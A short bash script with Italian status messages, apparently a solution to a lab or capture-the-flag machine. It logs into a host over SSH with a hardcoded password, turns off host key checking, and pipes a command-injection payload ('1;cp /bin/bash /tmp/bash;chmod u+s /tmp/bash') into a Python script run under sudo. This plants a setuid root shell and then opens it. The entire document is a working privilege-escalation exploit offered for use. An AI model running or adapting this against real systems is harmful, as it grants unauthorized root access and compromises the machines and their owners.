#!/bin/bash

set -euo pipefail

TARGET="10.0.2.170"
USER_ATHENA="athena"
PASS_ATHENA='myvulnerableapp*'

SCRIPT="/usr/bin/python3 /home/team-tasks/cookie-gen.py"
INJECTION="1;cp /bin/bash /tmp/bash;chmod u+s /tmp/bash"

command -v sshpass >/dev/null || { echo "[-] sshpass non installato."; exit 1; }

echo "[*] Accesso come ${USER_ATHENA}@${TARGET} ed escalation a root..."

sshpass -p "${PASS_ATHENA}" ssh -t -o StrictHostKeyChecking=no \
    "${USER_ATHENA}@${TARGET}" \
    "sudo ${SCRIPT} <<< '${INJECTION}' >/dev/null; /tmp/bash -p"